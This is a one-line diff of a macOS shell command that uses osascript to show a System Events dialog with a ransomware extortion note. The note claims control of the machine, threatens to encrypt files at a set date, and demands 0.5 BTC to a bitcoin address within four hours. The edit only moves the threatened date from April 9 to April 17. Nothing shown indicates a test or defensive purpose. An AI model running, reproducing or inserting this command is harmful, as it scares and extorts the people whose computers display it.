@@ -1,1 +1,1 @@
-osascript -e 'tell app "System Events" to display dialog "ATTENTION! This system is under my control and your files will be encrypted at April 9, 12 AM. If you want to save your data, transfer 0.5 BTC to bc1qxy2kgdygjrsqtri2ag3rf2493p83kkfjhx1gir in 4 hours."'
+osascript -e 'tell app "System Events" to display dialog "ATTENTION! This system is under my control and your files will be encrypted at April 17, 12 AM. If you want to save your data, transfer 0.5 BTC to bc1qxy2kgdygjrsqtri2ag3rf2493p83kkfjhx1gir in 4 hours."'
